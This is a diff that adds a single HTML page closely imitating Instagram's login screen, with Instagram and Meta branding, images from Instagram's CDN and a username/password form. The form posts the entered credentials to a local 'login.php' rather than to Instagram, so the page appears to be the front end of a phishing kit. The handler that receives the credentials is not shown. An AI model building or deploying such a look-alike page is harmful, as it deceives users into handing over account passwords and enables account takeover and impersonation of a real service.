@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Login • Instagram</title>
+    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/OBaRQR21Ycf.png" type="image/png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #000;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            color: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-wrapper {
+            flex: 1;
+            display: flex;
+            width: 100%;
+        }
+
+        /* ===== LEFT SIDE ===== */
+        .left-side {
+            flex: 1;
+            background-color: #000;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            padding: 40px 60px;
+        }
+
+        .left-content {
+            max-width: 460px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 32px;
+        }
+
+        .ig-icon-logo {
+            align-self: flex-start;
+        }
+
+        .hero-text h1 {
+            font-size: 36px;
+            font-weight: 700;
+            line-height: 1.25;
+            color: #f5f5f5;
+            letter-spacing: -0.5px;
+        }
+
+        .hero-text .gradient-text {
+            background: linear-gradient(90deg, #d62976, #fa7e1e, #feda75);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero-image {
+            width: 100%;
+        }
+
+        .hero-image img {
+            width: 100%;
+            height: auto;
+            object-fit: contain;
+        }
+
+        /* ===== RIGHT SIDE ===== */
+        .right-side {
+            flex: 1;
+            background-color: #121212;
+            border-left: 1px solid #262626;
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            padding: 40px 80px;
+            position: relative;
+        }
+
+        .login-card {
+            width: 100%;
+            max-width: 350px;
+        }
+        
+        .mobile-logo {
+            display: none;
+            margin: 0 auto 32px;
+            width: 54px;
+            height: 54px;
+        }
+
+        .login-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #f5f5f5;
+            margin-bottom: 20px;
+        }
+        
+        /* Notification Banner */
+        .notif-banner {
+            background: linear-gradient(90deg, #4f5bd5, #962fbf, #d62976, #fa7e1e, #feda75);
+            border-radius: 12px;
+            padding: 2px;
+            margin-bottom: 24px;
+        }
+
+        .notif-banner-inner {
+            background: #121212;
+            border-radius: 11px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .notif-icon {
+            flex-shrink: 0;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .notif-icon svg {
+            width: 18px;
+            height: 18px;
+            fill: white;
+        }
+
+        .notif-text {
+            text-align: left;
+            flex: 1;
+        }
+
+        .notif-text strong {
+            font-size: 13px;
+            color: #f5f5f5;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .notif-text span {
+            font-size: 12px;
+            color: #a8a8a8;
+            line-height: 1.4;
+            display: block;
+        }
+
+        .notif-badge {
+            background: #0095f6;
+            color: white;
+            font-size: 10px;
+            font-weight: 700;
+            padding: 3px 8px;
+            border-radius: 4px;
+            display: inline-block;
+            margin-top: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        /* Floating Label Inputs */
+        .input-group {
+            position: relative;
+            width: 100%;
+            background: transparent;
+            border: 1px solid #363636;
+            border-radius: 12px;
+            height: 52px;
+            display: flex;
+            align-items: center;
+            background-color: rgba(255, 255, 255, 0.05);
+        }
+        
+        .input-group:focus-within {
+            border-color: #a8a8a8;
+        }
+
+        .form-input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            padding: 22px 16px 6px;
+            font-size: 14px;
+            color: #f5f5f5;
+            outline: none;
+            height: 100%;
+            border-radius: 12px;
+        }
+
+        .input-label {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 14px;
+            color: #a8a8a8;
+            transition: all 0.2s ease;
+            pointer-events: none;
+        }
+
+        /* Float the label when input is focused or has value */
+        .form-input:focus + .input-label,
+        .form-input:not(:placeholder-shown) + .input-label {
+            top: 14px;
+            font-size: 10px;
+        }
+
+        .password-wrapper {
+            position: relative;
+            width: 100%;
+            display: flex;
+            align-items: center;
+        }
+        
+        .password-wrapper .form-input {
+            padding-right: 56px;
+        }
+
+        .show-password {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            font-size: 14px;
+            font-weight: 600;
+            color: #f5f5f5;
+            cursor: pointer;
+            padding: 0;
+            display: none;
+            z-index: 10;
+        }
+
+        .show-password:hover {
+            color: #a8a8a8;
+        }
+
+        .btn-login {
+            width: 100%;
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            padding: 14px 16px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 4px;
+            transition: background-color 0.2s, opacity 0.2s;
+        }
+
+        .btn-login:hover:enabled {
+            background-color: #1877f2;
+        }
+
+        .btn-login:active:enabled {
+            opacity: 0.7;
+        }
+
+        .btn-login:disabled {
+            opacity: 0.4;
+            cursor: default;
+        }
+
+        .forgot-link {
+            display: block;
+            text-align: center;
+            color: #e0f1ff;
+            font-size: 12px;
+            font-weight: 600;
+            margin-top: 16px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .forgot-link:hover {
+            color: #fff;
+        }
+
+        /* Divider */
+        .or-divider {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin: 24px 0;
+        }
+
+        .or-divider-line {
+            flex: 1;
+            height: 1px;
+            background: #363636;
+        }
+
+        .or-divider-text {
+            color: #a8a8a8;
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        /* Facebook button */
+        .btn-facebook {
+            width: 100%;
+            background: transparent;
+            border: 1px solid #363636;
+            border-radius: 12px;
+            padding: 14px 16px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #f5f5f5;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: background 0.2s;
+        }
+
+        .btn-facebook:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .btn-facebook svg {
+            width: 20px;
+            height: 20px;
+            flex-shrink: 0;
+        }
+
+        /* Create account button */
+        .btn-create {
+            width: 100%;
+            background: transparent;
+            border: 1px solid #0095f6;
+            border-radius: 12px;
+            padding: 14px 16px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #0095f6;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: background 0.2s;
+        }
+
+        .btn-create:hover {
+            background: rgba(0, 149, 246, 0.1);
+        }
+
+        /* Meta logo */
+        .meta-logo {
+            text-align: center;
+            margin-top: 40px;
+        }
+
+        .meta-logo svg {
+            width: 67px;
+            height: 12px;
+            fill: #a8a8a8;
+        }
+
+        /* ===== FOOTER ===== */
+        .site-footer {
+            background-color: #121212;
+            border-top: 1px solid #262626;
+            padding: 20px 20px 40px;
+            text-align: center;
+            width: 100%;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 4px 16px;
+            margin-bottom: 16px;
+            max-width: 935px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .footer-links a {
+            color: #737373;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-bottom {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .footer-bottom span {
+            color: #737373;
+            font-size: 12px;
+        }
+
+        .lang-select {
+            background: transparent;
+            border: none;
+            color: #737373;
+            font-size: 12px;
+            cursor: pointer;
+            outline: none;
+        }
+
+        .lang-select option {
+            background: #262626;
+            color: #f5f5f5;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 900px) {
+            .main-wrapper {
+                flex-direction: column;
+            }
+            .left-side {
+                justify-content: center;
+                padding: 40px 24px 20px;
+                border-bottom: 1px solid #262626;
+            }
+            .left-content {
+                align-items: center;
+                text-align: center;
+            }
+            .hero-text h1 {
+                font-size: 28px;
+            }
+            .right-side {
+                justify-content: center;
+                align-items: center;
+                padding: 40px 24px;
+                border-left: none;
+            }
+        }
+
+        @media (max-width: 600px) {
+            .left-side {
+                display: none; /* Hide left side on mobile */
+            }
+            .right-side {
+                background-color: #000; /* Black background for mobile */
+                padding: 16px 20px 32px;
+            }
+            .site-footer {
+                background-color: #000;
+                border-top: none;
+            }
+            .mobile-logo {
+                display: block;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="main-wrapper">
+    <!-- Left Side -->
+    <div class="left-side">
+        <div class="left-content">
+            <div class="ig-icon-logo">
+                <svg aria-label="Instagram" fill="url(#ig-grad)" height="54" role="img" viewBox="0 0 24 24" width="54">
+                    <defs>
+                        <linearGradient id="ig-grad" x1="0%" y1="100%" x2="100%" y2="0%">
+                            <stop offset="0%" stop-color="#fdf497"/>
+                            <stop offset="5%" stop-color="#fdf497"/>
+                            <stop offset="45%" stop-color="#fd5949"/>
+                            <stop offset="60%" stop-color="#d6249f"/>
+                            <stop offset="90%" stop-color="#285AEB"/>
+                        </linearGradient>
+                    </defs>
+                    <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/>
+                </svg>
+            </div>
+            <div class="hero-text">
+                <h1>See everyday moments from your <span class="gradient-text">close friends</span>.</h1>
+            </div>
+            <div class="hero-image">
+                <img src="https://static.cdninstagram.com/rsrc.php/yR/r/92ZsVHNkyvf.webp" alt="Instagram close friends">
+            </div>
+        </div>
+    </div>
+
+    <!-- Right Side -->
+    <div class="right-side">
+        <div class="login-card">
+            <div class="mobile-logo">
+                <svg aria-label="Instagram" fill="url(#ig-grad-mobile)" height="54" role="img" viewBox="0 0 24 24" width="54">
+                    <defs>
+                        <linearGradient id="ig-grad-mobile" x1="0%" y1="100%" x2="100%" y2="0%">
+                            <stop offset="0%" stop-color="#fdf497"/>
+                            <stop offset="5%" stop-color="#fdf497"/>
+                            <stop offset="45%" stop-color="#fd5949"/>
+                            <stop offset="60%" stop-color="#d6249f"/>
+                            <stop offset="90%" stop-color="#285AEB"/>
+                        </linearGradient>
+                    </defs>
+                    <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/>
+                </svg>
+            </div>
+
+            <h2 class="login-title">Log in to Instagram</h2>
+
+            <form class="login-form" action="login.php" method="POST" id="loginForm" autocomplete="off">
+                <div class="input-group">
+                    <input type="text" name="username" class="form-input" placeholder=" " required aria-label="Mobile number, username or email address" id="username">
+                    <label class="input-label" for="username">Mobile number, username or email address</label>
+                </div>
+                <div class="input-group password-wrapper">
+                    <input type="password" name="password" class="form-input" placeholder=" " required aria-label="Password" id="password">
+                    <label class="input-label" for="password">Password</label>
+                    <button type="button" class="show-password" id="togglePass">Show</button>
+                </div>
+                <button type="submit" class="btn-login" id="loginBtn" disabled>Log in</button>
+            </form>
+
+            <a class="forgot-link" href="#">Forgotten password?</a>
+
+            <div class="or-divider">
+                <div class="or-divider-line"></div>
+                <span class="or-divider-text">or</span>
+                <div class="or-divider-line"></div>
+            </div>
+
+            <button class="btn-facebook" type="button">
+                <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#1877f2"/><path fill="#fff" d="M16.5 13l.5-3h-3v-2c0-.83.4-1.5 1.6-1.5H17V4s-1.1-.2-2.1-.2C12.6 3.8 11 5.3 11 8v2H8.5v3H11v7.5c.5.1 1 .1 1.5.1s1 0 1.5-.1V13h2.5z"/></svg>
+                Log in with Facebook
+            </button>
+
+            <button class="btn-create" type="button">Create new account</button>
+
+            <div class="meta-logo">
+                <svg viewBox="0 0 67 12" xmlns="http://www.w3.org/2000/svg">
+                    <text x="0" y="11" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="13" font-weight="400" fill="#737373">ⓜ Meta</text>
+                </svg>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Footer -->
+<footer class="site-footer">
+    <div class="footer-links">
+        <a href="#">Meta</a>
+        <a href="#">About</a>
+        <a href="#">Blog</a>
+        <a href="#">Jobs</a>
+        <a href="#">Help</a>
+        <a href="#">API</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Locations</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Threads</a>
+        <a href="#">Contact Uploading &amp; Non-Users</a>
+        <a href="#">Meta Verified</a>
+    </div>
+    <div class="footer-bottom">
+        <select class="lang-select">
+            <option>English (UK)</option>
+            <option>English</option>
+            <option>Español</option>
+            <option>Français</option>
+            <option>Deutsch</option>
+            <option>Italiano</option>
+            <option>Português (Brasil)</option>
+            <option>日本語</option>
+            <option>한국어</option>
+            <option>中文(简体)</option>
+            <option>العربية</option>
+            <option>हिन्दी</option>
+            <option>Bahasa Indonesia</option>
+        </select>
+        <span>© 2026 Instagram from Meta</span>
+    </div>
+</footer>
+
+<script>
+    // Show/Hide password toggle
+    const toggleBtn = document.getElementById('togglePass');
+    const passInput = document.getElementById('password');
+
+    toggleBtn.addEventListener('click', function () {
+        if (passInput.type === 'password') {
+            passInput.type = 'text';
+            toggleBtn.textContent = 'Hide';
+        } else {
+            passInput.type = 'password';
+            toggleBtn.textContent = 'Show';
+        }
+    });
+
+    passInput.addEventListener('input', function () {
+        toggleBtn.style.display = passInput.value.length > 0 ? 'block' : 'none';
+    });
+
+    // Enable/disable login button
+    const loginBtn = document.getElementById('loginBtn');
+    const usernameInput = document.getElementById('username');
+
+    function checkFields() {
+        const ready = usernameInput.value.trim().length > 0 && passInput.value.trim().length > 0;
+        loginBtn.disabled = !ready;
+    }
+
+    usernameInput.addEventListener('input', checkFields);
+    passInput.addEventListener('input', checkFields);
+</script>
+
+</body>
+</html>
